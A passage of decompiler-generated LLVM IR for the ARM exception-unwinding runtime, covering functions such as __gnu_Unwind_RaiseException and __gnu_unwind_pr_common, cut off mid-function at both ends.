  uselistorder i1 true, { 0, 3, 4, 5, 6, 7, 1, 148, 2, 129, 8, 9, 10, 11, 12, 13, 120, 121, 130, 131, 122, 14, 15, 16, 123, 124, 125, 132, 17, 18, 19, 22, 21, 20, 150, 151, 152, 153, 154, 155, 156, 126, 157, 158, 159, 136, 160, 161, 162, 163, 127, 164, 165, 166, 167, 168, 169, 170, 23, 171, 149, 172, 24, 25, 173, 174, 175, 176, 177, 26, 178, 179, 27, 28, 180, 29, 181, 182, 144, 32, 33, 34, 35, 30, 31, 145, 36, 146, 37, 183, 184, 39, 102, 40, 185, 186, 117, 187, 128, 188, 189, 38, 103, 190, 191, 192, 41, 101, 193, 42, 104, 194, 195, 196, 43, 197, 198, 199, 200, 201, 44, 45, 137, 46, 47, 48, 49, 147, 105, 202, 203, 204, 135, 205, 134, 50, 106, 107, 206, 139, 207, 208, 52, 209, 210, 53, 108, 212, 51, 213, 211, 214, 138, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 133, 215, 216, 217, 218, 219, 74, 111, 140, 220, 75, 110, 221, 76, 109, 222, 223, 224, 225, 77, 226, 141, 78, 113, 227, 79, 112, 228, 229, 80, 230, 231, 232, 233, 81, 234, 235, 236, 237, 82, 238, 239, 83, 84, 118, 85, 86, 87, 88, 119, 89, 240, 90, 143, 241, 242, 142, 243, 244, 91, 114, 92, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 94, 116, 95, 255, 256, 257, 96, 115, 258, 97, 93, 259, 260, 98, 99, 100 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_189bc, { 1, 0 }
  uselistorder label %dec_label_pc_189b4, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_189c8 = load i32, i32* @r4, align 4
  store i32 %v3_189c8, i32* %stack_var_-16, align 4
  %v6_189c8 = load i32, i32* @r5, align 4
  %v9_189c8 = load i32, i32* @r6, align 4
  %v12_189c8 = load i32, i32* @lr, align 4
  %v1_189cc = add i32 %entry_vrs, 60
  %v2_189cc = inttoptr i32 %v1_189cc to i32*
  %v3_189cc = load i32, i32* %v2_189cc, align 4
  %v2_189d0 = add i32 %entry_vrs, 64
  %v3_189d0 = inttoptr i32 %v2_189d0 to i32*
  store i32 %v3_189cc, i32* %v3_189d0, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_18a00 = load i32, i32* %v3_189d0, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_18a18 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_18a00)
  %v2_18a1c = icmp eq i32 %v2_18a18, 0
  br i1 %v2_18a1c, label %dec_label_pc_18a24, label %dec_label_pc_18a58

dec_label_pc_18a24:                               ; preds = %entry
  %v0_18a24 = load i32, i32* @r5, align 4
  %v1_18a2c = add i32 %v0_18a24, 16
  %v2_18a2c = inttoptr i32 %v1_18a2c to i32*
  %v3_18a2c = load i32, i32* %v2_18a2c, align 4
  call void @__pseudo_branch(i32 %v3_18a2c)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_18a44 = load i32, i32* %saved_vrs_-320, align 4
  %v1_18a48 = urem i32 %v2_18a44, 2
  %v2_18a48 = icmp eq i32 %v1_18a48, 0
  br i1 %v2_18a48, label %dec_label_pc_18a68, label %dec_label_pc_18a50

dec_label_pc_18a50:                               ; preds = %dec_label_pc_18a24, %dec_label_pc_18a68
  %v0_18a50 = phi i1 [ false, %dec_label_pc_18a24 ], [ %phitmp, %dec_label_pc_18a68 ]
  br i1 %v0_18a50, label %dec_label_pc_18a74, label %dec_label_pc_18a58

dec_label_pc_18a58:                               ; preds = %entry, %dec_label_pc_18a50
  %v2_18a60 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18a60, i32* @r4, align 4
  store i32 %v6_189c8, i32* @r5, align 4
  store i32 %v9_189c8, i32* @r6, align 4
  store i32 %v12_189c8, i32* @lr, align 4
  ret i32 9

dec_label_pc_18a68:                               ; preds = %dec_label_pc_18a24
  %v2_18a68 = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_18a68, i32* @r0, align 4
  %v1_18a6c = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_18a68)
  %v0_18a50.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_18a50.pre, 6
  br label %dec_label_pc_18a50

dec_label_pc_18a74:                               ; preds = %dec_label_pc_18a50
  %v0_18a74 = load i32, i32* @r5, align 4
  %v0_18a78 = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_18a74, i32 %v0_18a78)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder void (i32, i32)* @unwind_phase2, { 1, 0 }
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_18a58, { 1, 0 }
  uselistorder label %dec_label_pc_18a50, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_18a80 = add i32 %ucbp, 12
  %v2_18a80 = inttoptr i32 %v1_18a80 to i32*
  %v3_18a80 = load i32, i32* %v2_18a80, align 4
  %v2_18a84 = icmp eq i32 %v3_18a80, 0
  br i1 %v2_18a84, label %dec_label_pc_18a8c, label %dec_label_pc_18a90

dec_label_pc_18a8c:                               ; preds = %entry
  %v2_18a8c = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_18a90

dec_label_pc_18a90:                               ; preds = %entry, %dec_label_pc_18a8c
  %v1_18a90 = add i32 %entry_vrs, 60
  %v2_18a90 = inttoptr i32 %v1_18a90 to i32*
  %v3_18a90 = load i32, i32* %v2_18a90, align 4
  %v2_18a98 = add i32 %entry_vrs, 64
  %v3_18a98 = inttoptr i32 %v2_18a98 to i32*
  store i32 %v3_18a90, i32* %v3_18a98, align 4
  %v3_18a9c = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_18a9c

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_18a90, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_18afc

bb:                                               ; preds = %entry
  %v7_18ab4 = mul i32 %regclass, 4
  %v8_18ab4 = add i32 %v7_18ab4, ptrtoint (i32* @global_var_18abc.974 to i32)
  call void @__pseudo_branch(i32 %v8_18ab4)
  br label %dec_label_pc_18afc

dec_label_pc_18afc:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_4, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_18be4 = load i32, i32* @r4, align 4
  %v6_18be4 = load i32, i32* @r5, align 4
  %v2_18bf4 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_18bfc = add i32 %ucbp, 76
  %v2_18bfc = inttoptr i32 %v1_18bfc to i32*
  %v3_18bfc = load i32, i32* %v2_18bfc, align 4
  %v1_18c08 = inttoptr i32 %v3_18bfc to i32*
  %v2_18c08 = load i32, i32* %v1_18c08, align 4
  store i32 %v2_18c08, i32* @lr, align 4
  %v4_18c08 = add i32 %v3_18bfc, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_18c14 = urem i32 %state, 4
  store i32 %v1_18c14, i32* %r2.global-to-local, align 4
  %v1_18c18 = and i32 %state, 8
  store i32 %v1_18c18, i32* %r0.global-to-local, align 4
  %v4_18c28 = getelementptr inbounds %anon_struct_4, %anon_struct_4* %uws_-60, i32 0, i32 0
  store i32 %v2_18c08, i32* %v4_18c28, align 8
  br i1 %v2_18bf4, label %dec_label_pc_18c38, label %dec_label_pc_18f14

dec_label_pc_18c38:                               ; preds = %entry
  %v3_18c38 = mul i32 %v2_18c08, 256
  store i32 %v3_18c38, i32* %v4_18c28, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18c50

dec_label_pc_18c50:                               ; preds = %dec_label_pc_18f14, %dec_label_pc_18c38
  %v0_18c74647090 = phi i32 [ %v2_18f2c, %dec_label_pc_18f14 ], [ %v4_18c08, %dec_label_pc_18c38 ]
  store i32 %v1_18c14, i32* %r2.global-to-local, align 4
  %v1_18c54 = add i32 %ucbp, 80
  %v2_18c54 = inttoptr i32 %v1_18c54 to i32*
  %v3_18c54 = load i32, i32* %v2_18c54, align 4
  %v7_18c58 = icmp eq i32 %v1_18c14, 2
  br i1 %v7_18c58, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_18c50
  %v2_18c5c = add i32 %ucbp, 56
  %v3_18c5c = inttoptr i32 %v2_18c5c to i32*
  %v4_18c5c = load i32, i32* %v3_18c5c, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_18c50, %bb
  %v0_18c746470 = phi i32 [ %v0_18c74647090, %dec_label_pc_18c50 ], [ %v4_18c5c, %bb ]
  %v1_18c60 = urem i32 %v3_18c54, 2
  %v2_18c60 = icmp eq i32 %v1_18c60, 0
  br i1 %v2_18c60, label %dec_label_pc_18c74.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_18d34

dec_label_pc_18c74.preheader:                     ; preds = %bb148
  %v1_18c746571 = inttoptr i32 %v0_18c746470 to i32*
  %v2_18c746672 = load i32, i32* %v1_18c746571, align 4
  %v2_18c786874 = icmp eq i32 %v2_18c746672, 0
  br i1 %v2_18c786874, label %dec_label_pc_18d34, label %dec_label_pc_18c80.preheader.lr.ph.lr.ph

dec_label_pc_18c80.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_18c74.preheader
  %v7_18c84 = icmp eq i32 %id, 2
  %v2_18d10 = icmp eq i32 %v1_18c14, 0
  %v2_18edc = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_18df8 = icmp eq i32 %v1_18c18, 0
  br label %dec_label_pc_18c80.preheader.lr.ph

dec_label_pc_18c80.preheader.lr.ph:               ; preds = %dec_label_pc_18c80.preheader.lr.ph.lr.ph, %dec_label_pc_18f48
  %v1_18c9096 = phi i32 [ %v2_18c746672, %dec_label_pc_18c80.preheader.lr.ph.lr.ph ], [ %v2_18c7466, %dec_label_pc_18f48 ]
  %v1_18c8c93 = phi i32 [ %v0_18c746470, %dec_label_pc_18c80.preheader.lr.ph.lr.ph ], [ %v2_18f4c, %dec_label_pc_18f48 ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_18c80.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_18f48 ]
  br label %dec_label_pc_18c80.preheader

dec_label_pc_18c80.preheader:                     ; preds = %dec_label_pc_18c80.preheader.lr.ph, %dec_label_pc_18f0c
  %v1_18c9095 = phi i32 [ %v1_18c9096, %dec_label_pc_18c80.preheader.lr.ph ], [ %v2_18c74, %dec_label_pc_18f0c ]
  %v1_18c8c92 = phi i32 [ %v1_18c8c93, %dec_label_pc_18c80.preheader.lr.ph ], [ %v1_18f0c, %dec_label_pc_18f0c ]
  br label %dec_label_pc_18c80

dec_label_pc_18c80:                               ; preds = %dec_label_pc_18c80.preheader, %dec_label_pc_18d24
  %v1_18c90 = phi i32 [ %v1_18c9095, %dec_label_pc_18c80.preheader ], [ %v2_18d28, %dec_label_pc_18d24 ]
  %v1_18ca4 = phi i32 [ %v1_18c8c92, %dec_label_pc_18c80.preheader ], [ %v1_18d24, %dec_label_pc_18d24 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_18c84, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_18c80
  %v2_18c88 = add i32 %v1_18ca4, 4
  %v3_18c88 = inttoptr i32 %v2_18c88 to i32*
  %v4_18c88 = load i32, i32* %v3_18c88, align 4
  store i32 %v4_18c88, i32* @r5, align 4
  store i32 %v1_18c90, i32* @r6, align 4
  %v0_18c94109 = load i32, i32* @r8, align 4
  %v1_18c94110 = add i32 %v0_18c94109, 72
  %v2_18c94111 = inttoptr i32 %v1_18c94110 to i32*
  %v3_18c94112 = load i32, i32* %v2_18c94111, align 4
  store i32 %v3_18c94112, i32* @lr, align 4
  %v2_18ca0 = add i32 %v1_18ca4, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_18c80
  %v2_18c8c = add i32 %v1_18ca4, 2
  %v3_18c8c = inttoptr i32 %v2_18c8c to i16*
  %v4_18c8c = load i16, i16* %v3_18c8c, align 2
  %v5_18c8c = zext i16 %v4_18c8c to i32
  store i32 %v5_18c8c, i32* @r5, align 4
  %v0_18c94 = load i32, i32* @r8, align 4
  %v1_18c94 = add i32 %v0_18c94, 72
  %v2_18c94 = inttoptr i32 %v1_18c94 to i32*
  %v3_18c94 = load i32, i32* %v2_18c94, align 4
  store i32 %v3_18c94, i32* @lr, align 4
  %v2_18c9c = inttoptr i32 %v1_18ca4 to i16*
  %v3_18c9c = load i16, i16* %v2_18c9c, align 2
  %v4_18c9c = zext i16 %v3_18c9c to i32
  store i32 %v4_18c9c, i32* @r6, align 4
  %v2_18ca4 = add i32 %v1_18ca4, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_18ca4, %.thread16 ], [ %v2_18ca0, %bb151 ]
  %v3_18c94115 = phi i32 [ %v3_18c94, %.thread16 ], [ %v3_18c94112, %bb151 ]
  %v0_18cac113 = phi i32 [ %v5_18c8c, %.thread16 ], [ %v4_18c88, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_18cac = and i32 %v0_18cac113, -2
  %v2_18cb0 = add i32 %v1_18cac, %v3_18c94115
  store i32 %v2_18cb0, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18cc0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18cc0, i32* %r0.global-to-local, align 4
  %v5_18ccc = call i32 @_Unwind_VRS_Get(i32 %v0_18cc0, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18ccc, i32* %r0.global-to-local, align 4
  %v3_18cd0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_18cd0, i32* %r2.global-to-local, align 4
  %v0_18cd4 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_18cd4, %v3_18cd0
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_18ce0

._crit_edge:                                      ; preds = %bb152
  %v0_18cf8.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_18ce0:                               ; preds = %bb152
  %v0_18ce0 = load i32, i32* @r6, align 4
  %v1_18ce0 = and i32 %v0_18ce0, -2
  %v2_18ce4 = add i32 %v1_18ce0, %v0_18cd4
  %v3_18ce8 = icmp ult i32 %v3_18cd0, %v2_18ce4
  br i1 %v3_18ce8, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_18ce0
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_18ce0
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_18cf8 = phi i32 [ %v0_18cf8.pre, %._crit_edge ], [ %v0_18ce0, %bb153 ], [ %v0_18ce0, %.thread20 ]
  %v0_18ea0 = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_18cf4 = load i32, i32* @r5, align 4
  %v1_18cf8 = urem i32 %v0_18cf8, 2
  %v1_18cf4 = mul i32 %v0_18cf4, 2
  %v3_18cfc = and i32 %v1_18cf4, 2
  %v4_18cfc = or i32 %v3_18cfc, %v1_18cf8
  store i32 %v4_18cfc, i32* %r2.global-to-local, align 4
  %v7_18d00 = icmp eq i32 %v4_18cfc, 1
  br i1 %v7_18d00, label %dec_label_pc_18e94, label %dec_label_pc_18d08

dec_label_pc_18d08:                               ; preds = %bb154
  %v2_18d00 = icmp eq i32 %v4_18cfc, 0
  br i1 %v2_18d00, label %dec_label_pc_18d0c, label %dec_label_pc_18dbc

dec_label_pc_18d0c:                               ; preds = %dec_label_pc_18d08
  store i32 %v1_18c14, i32* %r2.global-to-local, align 4
  br i1 %v2_18d10, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_18d0c
  %v0_18d24119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_18d24

bb155:                                            ; preds = %dec_label_pc_18d0c
  %v2_18d1c = icmp eq i32 %v0_18ea0, 0
  %v0_18d24 = load i32, i32* @r7, align 4
  br i1 %v2_18d1c, label %dec_label_pc_18d24, label %dec_label_pc_1909c

dec_label_pc_18d24:                               ; preds = %.thread, %bb155
  %v0_18d24120 = phi i32 [ %v0_18d24119, %.thread ], [ %v0_18d24, %bb155 ]
  %v1_18d24 = add i32 %v0_18d24120, 4
  %v1_18d28 = inttoptr i32 %v1_18d24 to i32*
  %v2_18d28 = load i32, i32* %v1_18d28, align 4
  %v2_18d2c = icmp eq i32 %v2_18d28, 0
  br i1 %v2_18d2c, label %dec_label_pc_18d34, label %dec_label_pc_18c80

dec_label_pc_18d34:                               ; preds = %dec_label_pc_18f48, %dec_label_pc_18f0c, %dec_label_pc_18d24, %dec_label_pc_18c74.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_18c74.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18d24 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18f0c ], [ %stack_var_-76.4, %dec_label_pc_18f48 ]
  %v0_18d34 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18d34, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_4* %uws_-60 to %anon_struct_13*
  %v4_18d3c = call i32 @__gnu_unwind_execute(i32 %v0_18d34, %anon_struct_13* %tmp156)
  store i32 %v4_18d3c, i32* %r0.global-to-local, align 4
  store i32 %v4_18d3c, i32* %r5.global-to-local, align 4
  %v2_18d40 = icmp eq i32 %v4_18d3c, 0
  br i1 %v2_18d40, label %dec_label_pc_18d48, label %dec_label_pc_18dc4

dec_label_pc_18d48:                               ; preds = %dec_label_pc_18d34
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_18d4c = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_18d4c, label %bb157, label %dec_label_pc_18d58

bb157:                                            ; preds = %dec_label_pc_18d48
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18dc8

dec_label_pc_18d58:                               ; preds = %dec_label_pc_18d48
  %v2_18d58 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_18d58, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18d68 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18d68, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_18d70 = call i32 @_Unwind_VRS_Get(i32 %v0_18d68, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_18d74 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_18d68, i32* %r0.global-to-local, align 4
  %v5_18d88 = call i32 @_Unwind_VRS_Set(i32 %v0_18d68, i32 %v0_18d74, i32 14, i32 %v0_18d74, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18d88, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r2.global-to-local, align 4
  %v4_18d94 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 36) to i32*), align 4
  %v0_18d98 = load i32, i32* %r5.global-to-local, align 4
  %v0_18d9c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18d9c, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_18d94, i32* %stack_var_-48, align 4
  %v5_18db0 = call i32 @_Unwind_VRS_Set(i32 %v0_18d9c, i32 %v0_18d98, i32 15, i32 %v0_18d98, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18dc8

dec_label_pc_18dbc:                               ; preds = %dec_label_pc_18d08
  %v7_18dbc = icmp eq i32 %v4_18cfc, 2
  br i1 %v7_18dbc, label %dec_label_pc_18dd4, label %dec_label_pc_18dc4

dec_label_pc_18dc4:                               ; preds = %dec_label_pc_18dbc, %dec_label_pc_18ea8, %dec_label_pc_18d34, %dec_label_pc_1909c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18dc8

dec_label_pc_18dc8:                               ; preds = %bb157, %dec_label_pc_190d4, %dec_label_pc_19064, %bb166, %dec_label_pc_18d58, %dec_label_pc_18dc4
  %v1_18dd0 = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_190d4 ], [ %v1_18dd0.pre, %dec_label_pc_19064 ], [ 7, %bb166 ], [ 7, %dec_label_pc_18d58 ], [ 9, %dec_label_pc_18dc4 ]
  store i32 %v3_18be4, i32* %r4.global-to-local, align 4
  store i32 %v6_18be4, i32* %r5.global-to-local, align 4
  ret i32 %v1_18dd0

dec_label_pc_18dd4:                               ; preds = %dec_label_pc_18dbc
  store i32 %v1_18c14, i32* %r2.global-to-local, align 4
  %v0_18dd8 = load i32, i32* @r7, align 4
  %v1_18dd8 = inttoptr i32 %v0_18dd8 to i32*
  %v2_18dd8 = load i32, i32* %v1_18dd8, align 4
  %tmp206 = bitcast i32 %v2_18dd8 to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_18de0 = bitcast float %tmp207 to i32
  store i32 %v1_18de0, i32* @sl, align 4
  br i1 %v2_18d10, label %dec_label_pc_18de8, label %dec_label_pc_18f54

dec_label_pc_18de8:                               ; preds = %dec_label_pc_18dd4
  %v2_18de8 = icmp eq i32 %v0_18ea0, 0
  br i1 %v2_18de8, label %dec_label_pc_18f3c, label %dec_label_pc_18df0

dec_label_pc_18df0:                               ; preds = %dec_label_pc_18de8
  %v2_18df4 = icmp eq i32 %v1_18de0, 0
  br i1 %v2_18df4, label %dec_label_pc_18e00.thread, label %bb159

dec_label_pc_18e00.thread:                        ; preds = %dec_label_pc_18df0
  br label %dec_label_pc_19064

bb159:                                            ; preds = %dec_label_pc_18df0
  br i1 %v3_18df8, label %dec_label_pc_18e08, label %dec_label_pc_18f3c

dec_label_pc_18e08:                               ; preds = %bb159
  %v1_18e08 = add i32 %v0_18dd8, 4
  store i32 %v1_18e08, i32* @r6, align 4
  store i32 108, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_18e18 = load i32, i32* @r8, align 4
  %v1_18e18 = add i32 %v0_18e18, 88
  store i32 %v1_18e18, i32* %sb.global-to-local, align 4
  store i32 %v1_18e08, i32* @r4, align 4
  br label %dec_label_pc_18e3c

dec_label_pc_18e2c:                               ; preds = %bb161
  %v1_18e2c = add i32 %v0_18e2c, 1
  store i32 %v1_18e2c, i32* @r5, align 4
  %v1_18e30 = load i32, i32* @sl, align 4
  %v9_18e30 = icmp eq i32 %v1_18e2c, %v1_18e30
  %v0_18e34 = load i32, i32* @r4, align 4
  %v1_18e34 = add i32 %v0_18e34, 4
  store i32 %v1_18e34, i32* @r4, align 4
  br i1 %v9_18e30, label %dec_label_pc_19064, label %dec_label_pc_18e2c.dec_label_pc_18e3c_crit_edge

dec_label_pc_18e2c.dec_label_pc_18e3c_crit_edge:  ; preds = %dec_label_pc_18e2c
  %v0_18e48.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_18e3c

dec_label_pc_18e3c:                               ; preds = %dec_label_pc_18e2c.dec_label_pc_18e3c_crit_edge, %dec_label_pc_18e08
  %v0_18e48 = phi i32 [ %v0_18e48.pre, %dec_label_pc_18e2c.dec_label_pc_18e3c_crit_edge ], [ %v1_18e18, %dec_label_pc_18e08 ]
  %v1_18e4c = phi i32 [ %v1_18e34, %dec_label_pc_18e2c.dec_label_pc_18e3c_crit_edge ], [ %v1_18e08, %dec_label_pc_18e08 ]
  %v1_18e3c = inttoptr i32 %v1_18e4c to i32*
  %v2_18e3c = load i32, i32* %v1_18e3c, align 4
  %v2_18e40 = icmp eq i32 %v2_18e3c, 0
  store i32 %v0_18e48, i32* %forced_unwind_-44, align 4
  br i1 %v2_18e40, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_18e3c
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_18e3c, %bb160
  %v0_18e50 = load i32, i32* @r8, align 4
  store i32 %v0_18e50, i32* %r0.global-to-local, align 4
  store i32 %v2_18edc, i32* %r2.global-to-local, align 4
  %v4_18e60 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 108) to i32*), align 4
  store i32 101996, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18e60)
  %v0_18e6c = load i32, i32* %r0.global-to-local, align 4
  %v2_18e6c = icmp eq i32 %v0_18e6c, 0
  %v0_18e2c = load i32, i32* @r5, align 4
  br i1 %v2_18e6c, label %dec_label_pc_18e2c, label %dec_label_pc_18e74

dec_label_pc_18e74:                               ; preds = %bb161
  %v1_18e74 = load i32, i32* @sl, align 4
  %v9_18e74 = icmp eq i32 %v0_18e2c, %v1_18e74
  br i1 %v9_18e74, label %dec_label_pc_19064, label %dec_label_pc_18e7c

dec_label_pc_18e7c:                               ; preds = %dec_label_pc_18e74
  %v0_18e7c = load i32, i32* @r7, align 4
  %v1_18e7c = inttoptr i32 %v0_18e7c to i32*
  %v2_18e7c = load i32, i32* %v1_18e7c, align 4
  %v1_18e80 = icmp slt i32 %v2_18e7c, 0
  %v0_18e88.pre = load i32, i32* @r6, align 4
  br i1 %v1_18e80, label %dec_label_pc_18e88, label %dec_label_pc_18f48

dec_label_pc_18e88:                               ; preds = %dec_label_pc_18e7c, %dec_label_pc_18f40
  %v0_18e88 = phi i32 [ %storemerge, %dec_label_pc_18f40 ], [ %v0_18e88.pre, %dec_label_pc_18e7c ]
  store i32 %v0_18e88, i32* %r0.global-to-local, align 4
  %v1_18e8c = add i32 %v0_18e88, 4
  store i32 %v1_18e8c, i32* @r6, align 4
  br label %dec_label_pc_18f48

dec_label_pc_18e94:                               ; preds = %bb154
  store i32 %v1_18c14, i32* %r2.global-to-local, align 4
  br i1 %v2_18d10, label %dec_label_pc_18ea0, label %dec_label_pc_18f8c

dec_label_pc_18ea0:                               ; preds = %dec_label_pc_18e94
  %v2_18ea0 = icmp eq i32 %v0_18ea0, 0
  br i1 %v2_18ea0, label %dec_label_pc_18f0c, label %dec_label_pc_18ea8

dec_label_pc_18ea8:                               ; preds = %dec_label_pc_18ea0
  %v0_18ea8 = load i32, i32* @r7, align 4
  %v1_18ea8 = add i32 %v0_18ea8, 4
  %v2_18ea8 = inttoptr i32 %v1_18ea8 to i32*
  %v3_18ea8 = load i32, i32* %v2_18ea8, align 4
  %v7_18eac = icmp eq i32 %v3_18ea8, -2
  store i32 %v1_18ea8, i32* %r2.global-to-local, align 4
  br i1 %v7_18eac, label %dec_label_pc_18dc4, label %dec_label_pc_18eb8

dec_label_pc_18eb8:                               ; preds = %dec_label_pc_18ea8
  %v0_18eb8 = load i32, i32* @r8, align 4
  %v1_18eb8 = add i32 %v0_18eb8, 88
  %v7_18ebc = icmp eq i32 %v3_18ea8, -1
  store i32 %v1_18eb8, i32* %forced_unwind_-44, align 4
  br i1 %v7_18ebc, label %dec_label_pc_18f00, label %dec_label_pc_18ec8

dec_label_pc_18ec8:                               ; preds = %dec_label_pc_18eb8
  %v2_18ecc = icmp eq i32 %v3_18ea8, 0
  br i1 %v2_18ecc, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_18ec8
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_18ec8, %bb162
  store i32 %v0_18eb8, i32* %r0.global-to-local, align 4
  store i32 %v2_18edc, i32* %r2.global-to-local, align 4
  %v4_18ee8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 108) to i32*), align 4
  store i32 102132, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18ee8)
  %v0_18ef4 = load i32, i32* %r0.global-to-local, align 4
  %v2_18ef4 = icmp eq i32 %v0_18ef4, 0
  br i1 %v2_18ef4, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_18f00.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_18f00

bb164:                                            ; preds = %bb163
